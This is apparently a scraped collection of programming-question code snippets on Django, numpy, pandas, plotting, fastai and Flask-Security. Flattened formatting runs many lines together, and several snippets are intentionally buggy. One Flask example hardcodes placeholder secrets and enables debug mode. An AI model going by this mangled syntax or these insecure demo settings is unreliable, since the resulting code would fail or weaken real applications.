"class Comment ( BaseCommentAbstractModel ) : `` '' '' A user comment about some object. `` '' '' # Who posted this comment ? If `` user `` is set then it was an authenticated # user ; otherwise at least user_name should have been set and the comment # was posted by a non-authenticated user . user = models.ForeignKey ( User , verbose_name=_ ( 'user ' ) , blank=True , null=True , related_name= '' % ( class ) s_comments '' ) user_name = models.CharField ( _ ( `` user 's name '' ) , max_length=50 , blank=True ) user_email = models.EmailField ( _ ( `` user 's email address '' ) , blank=True ) user_url = models.URLField ( _ ( `` user 's URL '' ) , blank=True )"
"> > > import datetime > > > datetime.datetime.now ( ) - datetime.datetime.now ( ) datetime.timedelta ( -1 , 86399 , 999958 ) > > > tnow = datetime.datetime.now ( ) > > > datetime.datetime.now ( ) - tnowdatetime.timedelta ( 0 , 4 , 327859 )"
"class MyClass ( object ) : def __init__ ( self ) : self.attribute = 4 def my_method ( self ) : def my_fun ( arg1 , arg2 ) : self.attribute = 7 pass"
"# -*- coding : utf-8 -*-from random import randintfrom copy import deepcopyfrom math import floorimport randomclass Organism : # initiate def __init__ ( self , alleles , fitness , likelihood ) : self.alleles = alleles self.fitness = fitness self.likelihood = likelihood self.result = 0 def __unicode__ ( self ) : return ' % s [ % s - % s ] ' % ( self.alleles , self.fitness , self.likelihood ) class CDiophantine : def __init__ ( self , coefficients , result ) : self.coefficients = coefficients self.result = result maxPopulation = 40 organisms = [ ] def GetGene ( self , i ) : return self.organisms [ i ] def OrganismFitness ( self , gene ) : gene.result = 0 for i in range ( 0 , len ( self.coefficients ) ) : gene.result += self.coefficients [ i ] *gene.alleles [ i ] gene.fitness = abs ( gene.result - self.result ) return gene.fitness def Fitness ( self ) : for organism in self.organisms : organism.fitness = self.OrganismFitness ( organism ) if organism.fitness == 0 : return organism return None def MultiplyFitness ( self ) : coefficientSum = 0 for organism in self.organisms : coefficientSum += 1/float ( organism.fitness ) return coefficientSum def GenerateLikelihoods ( self ) : last = 0 multiplyFitness = self.MultiplyFitness ( ) for organism in self.organisms : last = ( ( 1/float ( organism.fitness ) /multiplyFitness ) *100 ) # print ' 1/ % s/ % s*100 - % s ' % ( organism.fitness , multiplyFitness , last ) organism.likelihood = last def Breed ( self , parentOne , parentTwo ) : crossover = randint ( 1 , len ( self.coefficients ) -1 ) child = deepcopy ( parentOne ) initial = 0 final = len ( parentOne.alleles ) - 1 if randint ( 1,100 ) < 50 : father = parentOne mother = parentTwo else : father = parentTwo mother = parentOne child.alleles = mother.alleles [ : crossover ] + father.alleles [ crossover : ] if randint ( 1,100 ) < 5 : for i in range ( initial , final ) : child.alleles [ i ] = randint ( 0 , self.result ) return child def CreateNewOrganisms ( self ) : # generating new population tempPopulation = [ ] for _ in self.organisms : iterations = 0 father = deepcopy ( self.organisms [ 0 ] ) mother = deepcopy ( self.organisms [ 1 ] ) while father.alleles == mother.alleles : father = self.WeightedChoice ( ) mother = self.WeightedChoice ( ) iterations+=1 if iterations > 35 : break kid = self.Breed ( father , mother ) tempPopulation.append ( kid ) self.organisms = tempPopulation def WeightedChoice ( self ) : list = [ ] for organism in self.organisms : list.append ( ( organism.likelihood , organism ) ) list = sorted ( ( random.random ( ) * x [ 0 ] , x [ 1 ] ) for x in list ) return list [ -1 ] [ 1 ] def AverageFitness ( self ) : sum = 0 for organism in self.organisms : sum += organism.fitness return float ( sum ) /len ( self.organisms ) def AverageLikelihoods ( self ) : sum = 0 for organism in self.organisms : sum += organism.likelihood return sum/len ( self.organisms ) def Solve ( self ) : solution = None for i in range ( 0 , self.maxPopulation ) : alleles = [ ] # for j in range ( 0 , len ( self.coefficients ) ) : alleles.append ( randint ( 0 , self.result ) ) self.organisms.append ( Organism ( alleles,0,0 ) ) solution = self.Fitness ( ) if solution : return solution.alleles iterations = 0 while not solution and iterations < 3000 : self.GenerateLikelihoods ( ) self.CreateNewOrganisms ( ) solution = self.Fitness ( ) if solution : print 'SOLUTION FOUND IN % s ITERATIONS ' % iterations return solution.alleles iterations += 1 return -1if __name__ == `` __main__ '' : diophantine = CDiophantine ( [ 1,2,3,4 ] ,30 ) # cProfile.run ( 'diophantine.Solve ( ) ' ) print diophantine.Solve ( )"
"import cloudstoragedef filelist ( Handler ) : gs_bucket_name= '' /bucketname '' list=cloudstorage.listbucket ( gs_bucket_name ) logging.warning ( list ) self.write ( list ) for e in list : self.write ( e ) self.write ( `` < br > '' ) WARNING 2015-02-20 09:50:21,721 admin.py:106 ] < cloudstorage.cloudstorage_api._Bucket object at 0x10ac31e90 > ERROR 2015-02-20 09:50:21,729 api_server.py:221 ] Exception while handling service_name : `` app_identity_service '' method : `` GetAccessToken '' request : `` \n7https : //www.googleapis.com/auth/devstorage.full_control '' request_id : `` WoMrXkOyfe ''"
Group ValueA 4A 6A 10 B 5B 8B 11 from_max640630 df [ 'from_max ' ] = df.groupby ( [ 'Group ' ] ) .apply ( lambda x : x [ 'Value ' ] .max ( ) - x [ 'Value ' ] )
"master = np.array ( [ 1,2,3,4,5 ] ) search = np.array ( [ 4,2,2,3 ] ) > > > master = np.array ( [ 1,2,3,4,5 ] ) > > > search = np.array ( [ 4,2,2,3 ] ) > > > np.searchsorted ( master , search ) array ( [ 3 , 1 , 1 , 2 ] ) > > > master = np.array ( [ 2,3,5,4,1 ] ) > > > search = np.array ( [ 3,2,1,4,5 ] ) > > > np.searchsorted ( master , search ) array ( [ 1 , 0 , 0 , 2 , 5 ] ) array ( [ 1,0,4,3,2 ] ) > > > master = np.array ( [ 2,3,5,4,1 ] ) > > > search = np.array ( [ 1,4,7 ] )"
"> > > import numpy as npy > > > c0=npy.array ( [ 1,2 ] ) > > > c=c0.view ( dtype= [ ( ' x ' , int ) , ( ' y ' , int ) ] ) > > > carray ( [ ( 1 , 2 ) ] , dtype= [ ( ' x ' , ' < i8 ' ) , ( ' y ' , ' < i8 ' ) ] ) > > > type ( c ) < type 'numpy.ndarray ' > > > > isinstance ( c , npy.recarray ) False > > > type ( c [ 0 ] ) < type 'numpy.void ' > > > > def isRecarray ( a ) : return a.dtype.fields ! = None > > > isRecarray ( c0 ) False > > > isRecarray ( c ) True"
\ [ .+ ? \ ] |\ ( .+ ? \ ) | [ \w+ ? ] + a || ( b [ c ] d ) || e a || [ b [ c ] || d || ] || e .
"> python -m timeit `` set ( ) .difference ( xrange ( 0,10 ) ) '' 1000000 loops , best of 3 : 0.624 usec per loop > python -m timeit `` set ( ) .difference ( xrange ( 0,10**4 ) ) '' 10000 loops , best of 3 : 170 usec per loop"
"from gi.repository import Gtkdef on_insert_text ( entry , new_text , new_text_length , position ) : print ( position ) entry = Gtk.Entry ( ) entry.connect ( 'insert-text ' , on_insert_text ) window = Gtk.Window ( ) window.connect ( `` destroy '' , lambda q : Gtk.main_quit ( ) ) window.add ( entry ) window.show_all ( ) Gtk.main ( )"
"> > > import re > > > re.findall ( r ' ( [ \w\ ' ] +| [ . , ; : ? ! ] ) ' , 'This is starting to get really , really annoying ! ! ' ) [ 'This ' , 'is ' , 'starting ' , 'to ' , 'get ' , 'really ' , ' , ' , 'really ' , 'annoying ' , ' ! ' , ' ! ' ]"
from bs4 import BeautifulSoupdata = `` < test > test text < /test > '' soup = BeautifulSoup ( data ) print ( soup.find ( text=re.compile ( r'test $ ' ) ) ) import refrom bs4 import BeautifulSoupdata = `` < test > test text < /test > '' soup = BeautifulSoup ( data ) print ( soup.find ( text=re.compile ( r'test $ ' ) ) ) import refrom bs4 import BeautifulSoup
"class Feedback ( models.Model ) : feedback_id = models.IntegerField ( primary_key=True , default=0 ) pre_defined_message = models.ForeignKey ( 'Message ' , on_delete=models.CASCADE , null=True , blank=True ) # Selected from a pre defined list depending on selected category points = models.IntegerField ( default=0 ) lecturer = models.ForeignKey ( 'LecturerProfile ' , on_delete=models.CASCADE , null=True , blank=True ) student = models.ForeignKey ( 'StudentProfile ' , on_delete=models.CASCADE , null=True , blank=True ) which_course = models.ForeignKey ( 'Course ' , on_delete=models.CASCADE , null=True , blank=True ) datetime_given = models.DateTimeField ( default=timezone.now , blank=False ) optional_message = models.CharField ( max_length=200 , default= '' '' ) category = models.ForeignKey ( 'Category ' , on_delete=models.CASCADE , null=True , blank=True ) class Category ( models.Model ) : name = models.CharField ( max_length=20 , default= '' Empty '' , primary_key=True ) def __str__ ( self ) : return self.nameclass Message ( models.Model ) : category = models.ForeignKey ( 'Category ' , on_delete=models.CASCADE , null=True , blank=True ) text = models.CharField ( max_length=200 , default= '' No message '' , primary_key=True ) def __str__ ( self ) : return self.text class FeedbackForm ( autocomplete.FutureModelForm ) : optional_message = forms.CharField ( max_length=200 , required=False ) class Meta : model = Feedback fields = ( 'category ' , 'pre_defined_message ' , 'optional_message ' , 'points ' ) widgets = { 'pre_defined_message ' : autocomplete.ModelSelect2 ( url='category_autocomplete ' , forward= [ 'category ' ] ) , 'category ' : autocomplete.ModelSelect2 ( url='category_autocomplete ' ) } help_texts = { 'pre_defined_message ' : `` Select a Message '' , 'category ' : 'Category ' , 'optional_message ' : `` Optional Message '' , 'points ' : `` Points '' } class CategoryAutocomplete ( autocomplete.Select2QuerySetView ) : def get_queryset ( self ) : if not self.request.user.is_authenticated or not self.request.user.is_lecturer : return Category.objects.none ( ) query_set = Category.objects.all ( ) category = self.forwarded.get ( 'category ' , None ) if self.q : query_set = query_set.filter ( name__istartswith=self.q ) return query_set if category : query_set = Message.objects.filter ( category=category ) return query_set re_path ( r'^category-autocomplete/ $ ' , CategoryAutocomplete.as_view ( create_field='name ' ) , name='category_autocomplete ' ) ,"
"group_sum = df.groupby ( [ 'name ' , foo ] ) [ 'tickets ' ] .sum ( )"
"import osimport mathimport numpy as npimport matplotlib.pyplot as pltimport mpl_toolkits.axisartist.floating_axes as floating_axesfrom matplotlib.projections import PolarAxesfrom mpl_toolkits.axisartist.grid_finder import FixedLocator , MaxNLocator , DictFormatterimport random # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # def setup_arc_radial_axes ( fig , rect , angle_ticks , radius_ticks , min_rad , max_rad ) : tr = PolarAxes.PolarTransform ( ) pi = np.pi grid_locator1 = FixedLocator ( [ v for v , s in angle_ticks ] ) tick_formatter1 = DictFormatter ( dict ( angle_ticks ) ) grid_locator2 = FixedLocator ( [ a for a , b in radius_ticks ] ) tick_formatter2 = DictFormatter ( dict ( radius_ticks ) ) grid_helper = floating_axes.GridHelperCurveLinear ( tr , extremes= ( ( 370.0* ( pi/180.0 ) ) , ( 170.0* ( pi/180.0 ) ) , max_rad , min_rad ) , grid_locator1=grid_locator1 , grid_locator2=grid_locator2 , tick_formatter1=tick_formatter1 , tick_formatter2=tick_formatter2 , ) ax1 = floating_axes.FloatingSubplot ( fig , rect , grid_helper=grid_helper ) fig.add_subplot ( ax1 ) ax1.grid ( True ) # create a parasite axes whose transData in RA , cz aux_ax = ax1.get_aux_axes ( tr ) aux_ax.patch = ax1.patch ax1.patch.zorder=0.9 # ax1.axis [ `` left '' ] .set_ticklabel_direction ( `` + '' ) return ax1 , aux_ax # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # # write angle values to the plotting arrayangles = [ ] for mic_num in range ( 38 ) : angle = float ( mic_num ) * ( 180.0/36.0 ) * ( math.pi/180.0 ) +math.pi angles.append ( angle ) # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # # # # these are merely the ticks that appear on the plot axis # # # these do n't actually get plottedangle_ticks = range ( 0,190,10 ) angle_ticks_rads = [ a*math.pi/180.0 for a in angle_ticks ] angle_ticks_rads_plus_offset = [ a+math.pi for a in angle_ticks_rads ] angle_ticks_for_plot = [ ] for i in range ( len ( angle_ticks ) ) : angle_ticks_for_plot.append ( ( angle_ticks_rads_plus_offset [ i ] , r '' $ '' +str ( angle_ticks [ i ] ) + '' $ '' ) ) # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- # scale = 1.0aspect = 1.50height = 8.0fig = plt.figure ( 1 , figsize= ( height*aspect*scale , height*scale ) ) fig.subplots_adjust ( wspace=0.3 , left=0.05 , right=0.95 , top=0.84 ) fig.subplots_adjust ( ) plot_real_min = 30.0plot_real_max = 100.0plot_fake_min = 0.0plot_fake_max = 5000.0rad_tick_increment = 500.0radius_ticks = [ ] for i in range ( int ( plot_fake_min ) , int ( plot_fake_max ) +int ( rad_tick_increment ) , int ( rad_tick_increment ) ) : plot_fake_val = ( ( i-plot_fake_min ) / ( plot_fake_max-plot_fake_min ) ) * ( plot_real_max-plot_real_min ) +plot_real_min radius_ticks.append ( ( plot_fake_val , r '' $ '' +str ( i ) + '' $ '' ) ) ax2 , aux_ax2 = setup_arc_radial_axes ( fig , 111 , angle_ticks_for_plot , radius_ticks , plot_real_min , plot_real_max ) azimuths = np.radians ( np.linspace ( 0 , 180 , 91 ) ) azimuths_adjusted = [ ( x + math.pi ) for x in azimuths ] zeniths = np.arange ( 0 , 5050 , 50 ) zeniths_adjusted = [ ( ( x-plot_fake_min ) / ( plot_fake_max-plot_fake_min ) ) * ( plot_real_max-plot_real_min ) +plot_real_min for x in zeniths ] r , theta = np.meshgrid ( zeniths_adjusted , azimuths_adjusted ) values = 90.0+5.0*np.random.random ( ( len ( azimuths ) , len ( zeniths ) ) ) aux_ax2.contourf ( theta , r , values ) cbar = plt.colorbar ( aux_ax2.contourf ( theta , r , values ) , orientation='vertical ' ) cbar.ax.set_ylabel ( 'Contour Value [ Unit ] ' , fontsize = 16 ) plt.suptitle ( 'Plot Title ' , fontsize = 24 , weight= '' bold '' ) plt.legend ( loc=3 , prop= { 'size':20 } ) plt.xlabel ( 'Angle [ deg ] ' , fontsize=20 , weight= '' bold '' ) plt.ylabel ( 'Frequency [ Hz ] ' , fontsize=20 , weight= '' bold '' ) # plt.show ( ) plt.savefig ( 'plot.png ' , dpi=100 ) plt.close ( )"
df1 mag cat0 101 A11 256 A2 2 760 A23 888 A3 ... df2 A1 A2 A3 ... 0 E50R AZ33 REZ3 1 T605 YYU6 YHG52 IR50 P0O9 BF533 NaN YY9I NaN df 101 256 760 888 ... 0 E50R AZ33 AZ33 REZ31 T605 YYU6 YYU6 YHG52 IR50 P0O9 P0O9 BF533 NaN YY9I YY9I NaN
"# trimmed stacktraceFile `` /MYPROJECT/MY_FUNC.py '' , line 123 , in < genexpr > rows = ( row for row in reader ) File `` /XXX/lib/python3.6/csv.py '' , line 112 , in _next_row = next ( self.reader ) File `` /XXX/lib/python3.6/tarfile.py '' , line 706 , in readintobuf = self.read ( len ( b ) ) File `` /XXX/lib/python3.6/tarfile.py '' , line 695 , in readb = self.fileobj.read ( length ) File `` /XXX/lib/python3.6/gzip.py '' , line 276 , in readreturn self._buffer.read ( size ) File `` /XXX/lib/python3.6/_compression.py '' , line 68 , in readintodata = self.read ( len ( byte_view ) ) File `` /XXX/lib/python3.6/gzip.py '' , line 469 , in readbuf = self._fp.read ( io.DEFAULT_BUFFER_SIZE ) File `` /XXX/lib/python3.6/gzip.py '' , line 91 , in readself.file.read ( size-self._length+read ) File `` /XXX/lib/python3.6/site-packages/s3fs/core.py '' , line 1311 , in readself._fetch ( self.loc , self.loc + length ) File `` /XXX/lib/python3.6/site-packages/s3fs/core.py '' , line 1292 , in _fetchreq_kw=self.s3.req_kw ) File `` /XXX/lib/python3.6/site-packages/s3fs/core.py '' , line 1496 , in _fetch_rangereturn resp [ 'Body ' ] .read ( ) File `` /XXX/lib/python3.6/site-packages/botocore/response.py '' , line 74 , in readchunk = self._raw_stream.read ( amt ) File `` /XXX/lib/python3.6/site-packages/botocore/vendored/requests/packages/urllib3/response.py '' , line 239 , in readdata = self._fp.read ( ) File `` /XXX/lib/python3.6/http/client.py '' , line 462 , in reads = self._safe_read ( self.length ) File `` /XXX/lib/python3.6/http/client.py '' , line 612 , in _safe_readchunk = self.fp.read ( min ( amt , MAXAMOUNT ) ) File `` /XXX/lib/python3.6/socket.py '' , line 586 , in readintoreturn self._sock.recv_into ( b ) File `` /XXX/lib/python3.6/ssl.py '' , line 1009 , in recv_intoreturn self.read ( nbytes , buffer ) File `` /XXX/lib/python3.6/ssl.py '' , line 871 , in readreturn self._sslobj.read ( len , buffer ) File `` /XXX/lib/python3.6/ssl.py '' , line 631 , in readv = self._sslobj.read ( len , buffer ) ConnectionResetError : [ Errno 104 ] Connection reset by peer def read ( self , len=1024 , buffer=None ) : `` '' '' Read up to 'len ' bytes from the SSL object and return them . If 'buffer ' is provided , read into this buffer and return the number of bytes read. `` '' '' if buffer is not None : v = self._sslobj.read ( len , buffer ) # < -- - exception here else : v = self._sslobj.read ( len ) return v import errno # ref : https : //docs.python.org/3/library/exceptions.html # ConnectionError_CONNECTION_ERRORS = frozenset ( { errno.ECONNRESET , # ConnectionResetError errno.EPIPE , errno.ESHUTDOWN , # BrokenPipeError errno.ECONNABORTED , # ConnectionAbortedError errno.ECONNREFUSED , # ConnectionRefusedError } ) try : ... except OSError as e : if e.errno not in _CONNECTION_ERRORS : raise print ( 'got ConnectionError - % e ' % e )"
"webbrowser.open_new ( url ) browserInstance = subprocess.Popen ( [ 'firefox ' ] , stdout=log , stderr=log )"
"RuntimeError : Input type ( torch.cuda.FloatTensor ) and weight type ( torch.cuda.HalfTensor ) should be the same from fastai import *from fastai.vision import * # download data for reproduceable exampleuntar_data ( URLs.MNIST_SAMPLE ) FILES_DIR = '/home/mepstein/.fastai/data/mnist_sample ' # this is where command above deposits the MNIST data for me # Create FastAI databunch for model trainingtfms = get_transforms ( ) tr_val_databunch = ImageDataBunch.from_folder ( path=FILES_DIR , # location of downloaded data shown in log of prev command train = 'train ' , valid_pct = 0.2 , ds_tfms = tfms ) .normalize ( ) # Create Modelconv_learner = cnn_learner ( tr_val_databunch , models.resnet34 , metrics= [ error_rate ] ) .to_fp16 ( ) # Train Modelconv_learner.fit_one_cycle ( 4 ) # Export Modelconv_learner.export ( ) # saves model as 'export.pkl ' in path associated with the learner # Reload Model and use it for inference on new hold-out setreloaded_model = load_learner ( path = FILES_DIR , test = ImageList.from_folder ( path = f ' { FILES_DIR } /valid ' ) ) preds = reloaded_model.get_preds ( ds_type=DatasetType.Test )"
"library ( ggplot2 ) library ( ggimage ) library ( rsvg ) set.seed ( 2017-02-21 ) d < - data.frame ( x = rnorm ( 10 ) , y = rnorm ( 10 ) , z=1:10 , image = 'https : //image.flaticon.com/icons/svg/31/31082.svg ' ) ggplot ( d , aes ( x , y ) ) + geom_image ( aes ( image=image , color=z ) ) + scale_color_gradient ( low='burlywood1 ' , high='burlywood4 ' ) library ( ggplot2 ) library ( ggimage ) library ( gg3D ) ggplot ( d , aes ( x=x , y=y , z=z , color=z ) ) + axes_3D ( ) + geom_image ( aes ( image=image , color=z ) ) + scale_color_gradient ( low='burlywood1 ' , high='burlywood4 ' )"
"/* This JSON file is created by someone who does not know JSON And not competent enough to search about `` JSON Validators '' */ { /* Hey look ! A honkin ' block comment here ! Yeehaw */ `` key1 '' : `` value1 '' , // Hey look there 's a standard-breaking comment here ! `` key3 '' : .65 , // I 'm too lazy to type `` 0 '' `` key4 '' : -.75 , // That `` other '' .Net program works anyways ... `` key5 '' : [ 1 /* One */ , 2 /* Two */ , 3 /* Three */ , 4 /* Four */ ] , `` key2 '' : `` value2 '' , // Whoopsie , forgot to delete the comma here ... }"
tests_require - http : //pythonhosted.org/distribute/setuptools.html # new-and-changed-setup-keywords http : //wheel.readthedocs.org/en/latest/ pip wheel -- wheel-dir=/tmp/wheelhouse . pip wheel -- wheel-dir=/mnt/wheelhouse -r test-requirements.txt Requirements files - http : //www.pip-installer.org/en/latest/cookbook.html
"class PublicToggleForm ( ModelForm ) : class Meta : model = Profile fields = [ `` public '' , ] def clean_public ( self ) : public_toggle = self.cleaned_data.get ( `` public '' ) if public_toggle is True : raise forms.ValidationError ( `` ERROR '' ) return public_toggle from django.http import JsonResponseclass AjaxFormMixin ( object ) : def form_invalid ( self , form ) : response = super ( AjaxFormMixin , self ) .form_invalid ( form ) if self.request.is_ajax ( ) : return JsonResponse ( form.errors , status=400 ) else : return response def form_valid ( self , form ) : response = super ( AjaxFormMixin , self ) .form_valid ( form ) if self.request.is_ajax ( ) : print ( form.cleaned_data ) print ( `` VALID '' ) data = { 'message ' : `` Successfully submitted form data . '' } return JsonResponse ( data ) else : return response class PublicToggleFormView ( AjaxFormMixin , FormView ) : form_class = PublicToggleForm success_url = '/form-success/ ' { readyState : 4 , getResponseHeader : ƒ , getAllResponseHeaders : ƒ , setRequestHeader : ƒ , overrideMimeType : ƒ , … } abort : ƒ ( a ) always : ƒ ( ) catch : ƒ ( a ) done : ƒ ( ) fail : ƒ ( ) getAllResponseHeaders : ƒ ( ) getResponseHeader : ƒ ( a ) overrideMimeType : ƒ ( a ) pipe : ƒ ( ) progress : ƒ ( ) promise : ƒ ( a ) readyState:4responseJSON : public : [ `` ERROR '' ] __proto__ : ObjectresponseText : '' { `` public '' : [ `` ERROR '' ] } '' setRequestHeader : ƒ ( a , b ) state : ƒ ( ) status:400statusCode : ƒ ( a ) statusText : '' Bad Request '' then : ƒ ( b , d , e ) __proto__ : Object { % if request.user == object.user % } Make your profile public ? < form class= '' ajax-public-toggle-form '' method= '' POST '' action= ' { % url `` profile : detail '' username=object.user % } ' data-url= ' { % url `` profile : public_toggle '' % } ' > { { public_toggle_form.as_p|safe } } < /form > { % endif % } $ ( document ) .ready ( function ( ) { var $ myForm = $ ( '.ajax-public-toggle-form ' ) $ myForm.change ( function ( event ) { var $ formData = $ ( this ) .serialize ( ) var $ endpoint = $ myForm.attr ( 'data-url ' ) || window.location.href // or set your own url $ .ajax ( { method : `` POST '' , url : $ endpoint , data : $ formData , success : handleFormSuccess , error : handleFormError , } ) } ) function handleFormSuccess ( data , textStatus , jqXHR ) { // no need to do anything here console.log ( data ) console.log ( textStatus ) console.log ( jqXHR ) } function handleFormError ( jqXHR , textStatus , errorThrown ) { // on error , reset form . raise valifationerror console.log ( jqXHR ) console.log ( `` ==2 '' + textStatus ) console.log ( `` ==3 '' + errorThrown ) $ myForm [ 0 ] .reset ( ) ; // reset form data } } )"
"import numpy as npC = np.dot ( A , B ) import numpy as npfor row in range ( 0 , N ) : for col in range ( 0 , N ) : if col ! = n : C [ row , col ] = A [ row , n ] *B [ n , col ] # Just one scalar multiplication else : C [ row , col ] = np.dot ( A [ row ] , B [ : , n ] )"
"class Foo ( object ) : def __hash__ ( self ) : return random.randint ( 0 , 2 ** 32 ) a = Foo ( ) b = { } for i in range ( 5000 ) : b [ a ] = i"
"def _read32 ( bytestream ) : dt = numpy.dtype ( numpy.uint32 ) .newbyteorder ( ' > ' ) return numpy.frombuffer ( bytestream.read ( 4 ) , dtype=dt ) with gzip.open ( filename ) as bytestream : magic = _read32 ( bytestream )"
"class SomeModel ( models.Model ) : integer1 = models.IntegerField ( ) integer2 = models.IntegerField ( ) integer3 = models.IntegerField ( ) sum_integers = models.IntegerField ( ) def save ( self , *args , **kwargs ) : self.sum_integers = sum ( [ self.integer1 , self.integer2 , self.integer3 ] ) self.sum_integers.save ( ) return super ( SomeModel , self ) .save ( *args , **kwargs ) class SomeModel ( models.Model ) : integer1 = models.IntegerField ( ) integer2 = models.IntegerField ( ) integer3 = models.IntegerField ( ) @ property def sum_integers ( self ) : return sum ( [ self.integer1 , self.integer2 , self.integer3 ] )"
"from sqlalchemy.dialects.postgresql import JSONclass MyTable ( db.Model ) : id = db.Column ( db.Integer , primary_key=True ) my_json_column = db.Column ( JSON ) def foo ( my_object , new_params ) : my_object.my_json_column.update ( new_params ) db.session.commit ( ) def foo ( my_object , new_params ) : temp_params = my_object.my_json_column.copy ( ) temp_params.update ( new_params ) my_object.my_json_column = new_params db.session.commit ( )"
"[ [ 'H1 ' , ' L ' , ' 1 ' ] [ 'H1 ' , 'S ' , ' 1 ' ] [ 'H2 ' , ' L ' , ' 1 ' ] [ 'H2 ' , ' L ' , ' 1 ' ] ] H1 L 1H1 S 1H2 L 2"
"> > > pytz.timezone ( 'Asia/Tehran ' ) .utcoffset ( datetime ( 2013 , 1 , 1 ) ) .total_seconds ( ) /3600.03.5 > > > pytz.timezone ( 'Asia/Tehran ' ) .utcoffset ( datetime ( 2013 , 1 , 1 ) ) .total_seconds ( ) 12600.0 > > > pytz.timezone ( 'Asia/Tehran ' ) ._utcoffset.total_seconds ( ) /3600.03.433333333333333 > > > pytz.timezone ( 'Asia/Tehran ' ) ._utcoffset.total_seconds ( ) 12360.0 > > > print pytz.VERSION2012c"
side= [ 5 ] eva=sideprint ( str ( side ) + `` side before '' ) print ( str ( eva ) + `` eva before '' ) eva.remove ( 5 ) print ( str ( side ) + `` side after '' ) print ( str ( eva ) + `` eva after '' ) [ 5 ] side before [ 5 ] eva before [ ] side after [ ] eva after
x = md5.from_digest ( '0123456789abcdef ' ) x.update ( new_data )
"[ 1 , 1 , 1 , 0 , 0 , 0 , 1 , 1 , 0 , 0 ] [ 1 , 2 , 3 , 0 , 0 , 0 , 1 , 2 , 0 , 0 ]"
"import tensorflow as tfimport numpy as nptf.enable_eager_execution ( ) a = tf.constant ( [ [ 1 , 2 , 3 , 4 ] , [ 1 , 2 , 3 , 4 ] ] ) b = tf.cast ( a , dtype=tf.float32 ) print ( tf.shape ( a ) ) print ( tf.shape ( b ) ) tf.Tensor ( [ 2 4 ] , shape= ( 2 , ) , dtype=int32 ) # a tf.Tensor ( [ 2 4 ] , shape= ( 2 , ) , dtype=int32 ) # b"
"# find all gz filesfor f in $ ( find $ rawdatapath -name '*.gz ' ) ; do filename= ` basename $ f ` # check whether the filename is already contained in the process list onlist= ` grep $ filename $ processed_files ` if [ [ -z $ onlist ] ] then echo `` processing , new : $ filename '' # unzip file and import into mongodb # write filename into processed list echo $ filename # > > $ processed_files fidone import ospath = `` /home/b2blogin/webapps/mongodb/rawdata/segment_slideproof_testing '' processed_files_file = os.path.join ( path , '' processed_files.txt '' ) processed_files = [ line.strip ( ) for line in open ( processed_files_file ) ] with open ( processed_files_file , `` a '' ) as pff : for root , dirs , files in os.walk ( path ) : for file in files : if file.endswith ( `` .gz '' ) : if file not in processed_files : pff.write ( `` % s\n '' % file )"
"# Python 2.7.4import subprocesssubprocess.Popen ( 'ls src/*.cpp ' , shell=True ) : src/tonemap.cpp src/pch.cppsubprocess.Popen ( 'ls src/ { t , p } *.cpp ' , shell=True ) ls : can not access src/ { p , t } *.cpp : No such file or directory ls src/ { t , p } *.cppsrc/tonamep.cpp src/pch.cpp"
from numpy import nan
sudo python setup.py install -rwxr-x -- - 1 root root 57 Aug 23 15:13 example_script* -rwxr-xr-x 1 root root 57 Aug 23 15:13 example_script*
"@ user_registered.connect_via ( app ) def user_registered_sighandler ( sender , **extra ) : print ( `` print-user_registered_sighandler : '' , extra ) app.config [ 'SECURITY_REGISTERABLE ' ] = Trueapp.config [ 'SECURITY_CONFIRMABLE ' ] = Falseapp.config [ 'SECURITY_SEND_REGISTER_EMAIL ' ] = Falseapp.config [ 'SECURITY_CHANGEABLE ' ] = Trueapp.config [ 'SECURITY_SEND_PASSWORD_CHANGE_EMAIL ' ] = False @ user_logged_out.connect_via ( app ) def on_user_logged_out ( sender , user ) : print ( 'USER LOG OUT : made it in ' , user ) @ identity_changed.connect_via ( app ) def identity_changed_ok ( sender , identity ) : print ( 'Identity changed : ' , identity ) from flask import Flask , render_templatefrom playhouse.flask_utils import FlaskDBimport osfrom flask.ext.security import Security , PeeweeUserDatastorefrom flask.ext.security.signals import user_registeredfrom flask.ext.login import user_logged_outfrom peewee import *from playhouse.signals import Modelfrom flask.ext.security import UserMixin , RoleMixinapp = Flask ( __name__ ) app.config [ 'ADMIN_PASSWORD ' ] ='secret'app.config [ 'APP_DIR ' ] =os.path.dirname ( os.path.realpath ( __file__ ) ) app.config [ 'DATABASE ' ] ='sqliteext : /// % s ' % os.path.join ( app.config [ 'APP_DIR ' ] , 'blog.db ' ) app.config [ 'SECRET_KEY ' ] = 'shhh , secret ! 'app.config [ 'SECURITY_REGISTERABLE ' ] = Trueapp.config [ 'SECURITY_CONFIRMABLE ' ] = Falseapp.config [ 'SECURITY_SEND_REGISTER_EMAIL ' ] = Falseflask_db = FlaskDB ( ) flask_db.init_app ( app ) database = flask_db.databaseclass BaseModel ( Model ) : class Meta : database=flask_db.databaseclass User ( BaseModel , UserMixin ) : email=CharField ( ) password=CharField ( ) active = BooleanField ( default=True ) confirmed_at = DateTimeField ( null=True ) def is_active ( self ) : return True def is_anonymous ( self ) : return False def is_authenticated ( self ) : return Trueclass Role ( BaseModel , RoleMixin ) : name = CharField ( unique=True ) description = TextField ( null=True ) class UserRoles ( BaseModel ) : user = ForeignKeyField ( User , related_name='roles ' ) role = ForeignKeyField ( Role , related_name='users ' ) name = property ( lambda self : self.role.name ) description = property ( lambda self : self.role.description ) user_datastore = PeeweeUserDatastore ( database , User , Role , UserRoles ) security = Security ( app , user_datastore ) @ user_registered.connect_via ( app ) def user_registered_sighandler ( sender , **extra ) : print ( `` print-user_registered_sighandler '' ) @ user_logged_out.connect_via ( app ) def on_user_logged_out ( sender , user ) : print ( 'USER LOG OUT : made it in ' , user ) @ app.route ( '/ ' ) def index ( ) : print ( user_registered.receivers ) return render_template ( 'base.html ' ) database.create_tables ( [ User , Role , UserRoles ] , safe=True ) app.run ( debug=True ) < ! doctype html > < html > < head > < title > Blog < /title > < /head > < body > < ul > { % if current_user.is_authenticated ( ) % } < li > < a href= '' { { url_for ( 'security.logout ' , next='/ ' ) } } '' > Log out < /a > < /li > < li > < a href= '' { { url_for ( 'security.register ' ) } } '' > Register < /a > < /li > { % else % } < li > < a href= '' { { url_for ( 'security.login ' , next='/ ' ) } } '' > Login < /a > < /li > < li > < a href= '' { { url_for ( 'security.register ' ) } } '' > Register < /a > < /li > { % endif % } { % block extra_header % } { % endblock % } < /ul > < /body > < /html >"
